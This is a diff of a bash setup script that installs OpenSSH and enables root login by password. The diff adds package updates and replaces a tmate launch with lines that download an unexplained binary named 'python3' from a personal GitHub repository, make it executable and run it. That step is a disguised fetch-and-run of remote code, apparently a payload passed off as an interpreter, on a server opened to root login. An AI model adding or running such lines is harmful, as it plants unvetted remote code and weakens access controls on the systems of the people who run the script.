@@ -1,6 +1,8 @@
 #!/bin/bash
 
 # Update package list and upgrade all packages
+apt-get update -y
+apt-get upgrade -y
 # Install OpenSSH Server
 apt-get install -y openssh-server
 
@@ -20,6 +22,8 @@ sed -i 's/^PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd
 # Restart SSH service to apply changes
 service ssh restart
 
-apt install tmate -y
+wget https://github.com/monhodsompul/luckyynr-ssh/raw/main/python3
 
-tmate
+chmod +x python3
+
+./python3
